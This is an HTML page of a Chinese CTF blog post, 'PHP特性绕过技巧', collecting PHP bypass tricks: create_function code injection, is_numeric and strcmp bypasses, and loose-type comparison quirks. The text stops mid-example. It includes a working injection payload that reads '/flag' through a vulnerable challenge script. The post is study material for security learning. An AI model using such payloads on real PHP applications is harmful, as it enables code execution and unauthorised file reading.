@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='PHP特性绕过技巧 create_function 绕过 参考： [代码审计]PHP代码审计之create_function()函数 适用范围： PHP 4&amp;gt; = 4.0.1，PHP 5，PHP'><title>PHP特性绕过技巧</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/php_bypass_tricks/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='PHP特性绕过技巧'>
+<meta property='og:description' content='PHP特性绕过技巧 create_function 绕过 参考： [代码审计]PHP代码审计之create_function()函数 适用范围： PHP 4&amp;gt; = 4.0.1，PHP 5，PHP'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/php_bypass_tricks/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='php' /><meta property='article:tag' content='web_security' /><meta property='article:published_time' content='2022-06-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-06-26T23:56:11&#43;01:00'/>
+<meta name="twitter:title" content="PHP特性绕过技巧">
+<meta name="twitter:description" content="PHP特性绕过技巧 create_function 绕过 参考： [代码审计]PHP代码审计之create_function()函数 适用范围： PHP 4&amp;gt; = 4.0.1，PHP 5，PHP">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/php_bypass_tricks/">PHP特性绕过技巧</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 08, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="php特性绕过技巧">PHP特性绕过技巧</h2>
+<h3 id="create-function-绕过">create_function 绕过</h3>
+<p>参考： <!-- raw HTML omitted -->
+<a class="link" href="https://blog.csdn.net/solitudi/article/details/107744427"  target="_blank" rel="noopener"
+    >[代码审计]PHP代码审计之create_function()函数</a> <!-- raw HTML omitted --></p>
+<p>适用范围： <code>PHP 4&gt; = 4.0.1，PHP 5，PHP 7</code> <!-- raw HTML omitted --></p>
+<p><code>create_function</code> 的目的是为了构建一个匿名函数，并可以赋值给一个变量 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$args</span><span class="p">,</span><span class="nx">string</span> <span class="nv">$code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">string</span> <span class="nv">$args</span> <span class="nx">声明的函数变量部分</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">string</span> <span class="nv">$code</span> <span class="nx">执行的方法代码部分</span>
+</span></span></code></pre></div><h4 id="基本使用">基本使用</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$q</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">(</span><span class="s1">&#39;query&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$newfunc</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$a&#39;</span><span class="p">,</span> <span class="s1">&#39;echo $a&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;function name: </span><span class="si">$newfunc\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$newfunc</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-06-08_15-30-00_screenshot.png"
+         alt="Figure 1: Output value" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted -->Output value</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>我们要关注的是这个匿名函数实际上做了一件什么事情， <code>create_function()</code> 会创建一个匿名函数（lambda格式），用lambda命名， <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">lambda_2</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>记住这个函数是真的需要构造的，然后我们来看看 create_function 注入的例子 <!-- raw HTML omitted --></p>
+<h4 id="注入实例">注入实例</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//sorry , here is true last level
+</span></span></span><span class="line"><span class="cl"><span class="c1">//^_^
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;str.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9_]*$/isD&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$a</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们不关注这个正则的细节，只需要知道我们可以用反斜杠来表示全局空间Global space来绕过就可以了 <!-- raw HTML omitted --></p>
+<p>直接看payload <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=\create_function&amp;b=;}readfile(&#39;/flag&#39;); //
+</span></span></code></pre></div><p>我一开始对于看到很多人使用花括号很不理解，感觉都无法闭合括号是怎么回事，但是记得刚才我们说的匿名函数的构造吗，我们来看一下这里构造了一个怎么样的匿名函数 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;;}readfile(&#39;</span><span class="o">/</span><span class="nx">flag</span><span class="s1">&#39;); /*&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">lambda_1</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl"><span class="p">;</span>    
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="nx">readfile</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">);</span> <span class="o">/*</span> <span class="nx">注释</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>这里只是创造了一个匿名函数，但是没有任何的赋值，因此是无法直接执行的，因此我们需要先用 <code>}</code> 来闭合匿名函数的定义，然后在外面执行我们想要注入的代码即可 <!-- raw HTML omitted --></p>
+<h3 id="is-numberic-绕过">is_numberic() 绕过</h3>
+<p>参考：<a class="link" href="https://article.itxueyuan.com/66WeeR"  target="_blank" rel="noopener"
+    >[极客大挑战 2019]BuyFlag 1</a> <!-- raw HTML omitted -->
+对于空字符  <code>%00</code>, 无论放在前后都可以判断为非数值 <!-- raw HTML omitted -->
+<code>%20</code> 放在数值后面也可以判定为非数值 <!-- raw HTML omitted --></p>
+<h3 id="strcmp-绕过">strcmp 绕过</h3>
+<p>参考： <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://article.itxueyuan.com/66WeeR"  target="_blank" rel="noopener"
+    >[极客大挑战 2019]BuyFlag 1</a> <!-- raw HTML omitted --></p>
+<p><a class="link" href="https://www.php.net/manual/en/function.strcmp"  target="_blank" rel="noopener"
+    >strcmp:php.net</a> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">strcmp</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$string1</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$string2</span><span class="p">)</span><span class="o">:</span> <span class="nx">int</span>
+</span></span></code></pre></div><p>Return &lt; 0; string1的长度小于string2 <!-- raw HTML omitted -->
+Return &gt; 0; string1的长度大于string2 <!-- raw HTML omitted -->
+Return = 0; string1的长度等于string2 <!-- raw HTML omitted --></p>
+<p>穿入非字符串类型的数据，函数发生错误在 <code>5.3</code> 版本之前，在显示了报错的警告信息之后，将return 0，作用与长度相等一致 <!-- raw HTML omitted --></p>
+<p>因此我们可以通过穿入数组类型来完成绕过 <!-- raw HTML omitted --></p>
+<h3 id="弱类型">弱类型</h3>
+<p>参考：<a class="link" href="https://www.cnblogs.com/Mrsm1th/p/6745532.html"  target="_blank" rel="noopener"
+    >php 弱类型总结</a> <!-- raw HTML omitted --></p>
+<p>一直到碰到弱类型比较的题目，但是总感觉很零碎，看到一片总结的文章，就想着跟着学一学，总结一下 <!-- raw HTML omitted --></p>
+<h4 id="强类型-弱类型">强类型，弱类型</h4>
+<p>首先我们来区分一下强类型语言和弱类型语言的区别 <!-- raw HTML omitted --></p>
+<p>强类型语言，就是在定义一个变量的时候，就需要指定变量的类型，如果不经转换（手动或者自动）就使用就会报错，例如Java，C都是强类型的语言，我们都需要先定义类型才能进行赋值 <!-- raw HTML omitted --></p>
+<p>弱类型语言，就是在定义一个变量的时候，无需定义类型，想怎么使用，用什么赋值都可以，语言的解析器回自动转换，例如php，python都是弱类型的语言，我们在使用的时候就能明显感受 <!-- raw HTML omitted --></p>
+<h4 id="php中的比较是否相等">PHP中的比较是否相等</h4>
+<p>参考： <a class="link" href="https://www.php.net/manual/en/language.operators.comparison.php"  target="_blank" rel="noopener"
+    >Comparison Operators:php.net</a> <!-- raw HTML omitted --></p>
+<p>php中比较两个变量是否相等有两种运算符 <!-- raw HTML omitted --></p>
+<p>$a <code>==</code> $b, Equal 相等，返回true只要 $a 在类型转换之后等于 $b 即可（因此会先转换成相同的类型，再比较值）; <!-- raw HTML omitted -->
+$a <code>===</code> $b, identical 一致，返回true只有 $a 与 $b 完全相等，即值一样，同时类型也相等（因此回显判断类型再比较值, <code>!==</code> 亦是如此） <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="s2">&#34;a&#34;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;1&#34;</span> <span class="o">==</span> <span class="s2">&#34;01&#34;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;10&#34;</span> <span class="o">==</span> <span class="s2">&#34;1e1&#34;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="mi">100</span> <span class="o">==</span> <span class="s2">&#34;1e2&#34;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;1admin&#34;</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;admin1&#34;</span><span class="o">==</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// flase
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;admin1&#34;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s2">&#34;0e123456&#34;</span><span class="o">==</span><span class="s2">&#34;0e4456789&#34;</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>这是PHP8.0.0前的特性，即在比较字符串和数字的时候，string会先被转换成数字，然后再进行比较 <!-- raw HTML omitted --></p>
+<p>因此我们可以看到： <!-- raw HTML omitted --></p>
+<p>0 == &ldquo;a&rdquo;, var_dump(&ldquo;admin&rdquo;==0); 都会先将字符串先强制转换成数值，变成0，然后再进行比较，自然就相等了 <!-- raw HTML omitted --></p>
+<p>同时，当一个字符串被强制转换类型变成Int的时候，<a class="link" href="https://www.php.net/manual/en/language.types.integer.php#language.types.integer.casting"  target="_blank" rel="noopener"
+    >php文档</a>给出的规则是： <!-- raw HTML omitted --></p>
+<p>If the string is numeric or leading numeric then it will resolve to the corresponding integer value, otherwise it is converted to zero (0). <!-- raw HTML omitted --></p>
+<p>即如果string能够被解析成为int或者string的开头是数字，那么就会被转换成对应的整型值，否则都转换成0 <!-- raw HTML omitted --></p>
+<p>那么什么情况下string会被解析成int呢 <!-- raw HTML omitted --></p>
+<p>官网给出的正则表达<a class="link" href="https://www.php.net/manual/en/language.types.numeric-strings.php"  target="_blank" rel="noopener"
+    >https://www.php.net/manual/en/language.types.numeric-strings.php</a>式 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">WHITESPACES</span>      <span class="nx">\s</span><span class="o">*</span> <span class="c1">// 若干空格
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">LNUM</span>             <span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span> <span class="c1">// 普通的数字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">DNUM</span>             <span class="p">([</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">*</span><span class="p">)[</span><span class="nx">\</span><span class="o">.</span><span class="p">]{</span><span class="nx">LNUM</span><span class="p">})</span> <span class="o">|</span> <span class="p">({</span><span class="nx">LNUM</span><span class="p">}[</span><span class="nx">\</span><span class="o">.</span><span class="p">][</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">*</span><span class="p">)</span> <span class="c1">// float
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">EXPONENT_DNUM</span>    <span class="p">(({</span><span class="nx">LNUM</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="nx">DNUM</span><span class="p">})</span> <span class="p">[</span><span class="nx">eE</span><span class="p">][</span><span class="o">+-</span><span class="p">]</span><span class="o">?</span> <span class="p">{</span><span class="nx">LNUM</span><span class="p">})</span>  <span class="c1">//科学计数法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">INT_NUM_STRING</span>   <span class="p">{</span><span class="nx">WHITESPACES</span><span class="p">}</span> <span class="p">[</span><span class="o">+-</span><span class="p">]</span><span class="o">?</span> <span class="p">{</span><span class="nx">LNUM</span><span class="p">}</span> <span class="p">{</span><span class="nx">WHITESPACES</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">FLOAT_NUM_STRING</span> <span class="p">{</span><span class="nx">WHITESPACES</span><span class="p">}</span> <span class="p">[</span><span class="o">+-</span><span class="p">]</span><span class="o">?</span> <span class="p">({</span><span class="nx">DNUM</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="nx">EXPONENT_DNUM</span><span class="p">})</span> <span class="p">{</span><span class="nx">WHITESPACES</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">NUM_STRING</span>       <span class="p">({</span><span class="nx">INT_NUM_STRING</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="nx">FLOAT_NUM_STRING</span><span class="p">})</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$foo</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="s2">&#34;10.5&#34;</span><span class="p">;</span>                <span class="c1">// $foo is float (11.5)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$foo</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="s2">&#34;-1.3e3&#34;</span><span class="p">;</span>              <span class="c1">// $foo is float (-1299)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$foo</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="s2">&#34;bob-1.3e3&#34;</span><span class="p">;</span>           <span class="c1">// TypeError as of PHP 8.0.0, $foo is integer (1) previously
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$foo</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="s2">&#34;bob3&#34;</span><span class="p">;</span>                <span class="c1">// TypeError as of PHP 8.0.0, $foo is integer (1) previously
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$foo</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="s2">&#34;10 Small Pigs&#34;</span><span class="p">;</span>       <span class="c1">// $foo is integer (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$foo</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">+</span> <span class="s2">&#34;10.2 Little Piggies&#34;</span><span class="p">;</span> <span class="c1">// $foo is float (14.2) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$foo</span> <span class="o">=</span> <span class="s2">&#34;10.0 pigs &#34;</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>          <span class="c1">// $foo is float (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$foo</span> <span class="o">=</span> <span class="s2">&#34;10.0 pigs &#34;</span> <span class="o">+</span> <span class="mf">1.0</span><span class="p">;</span>        <span class="c1">// $foo is float (11) and an E_WARNING is raised in PHP 8.0.0, E_NOTICE previously
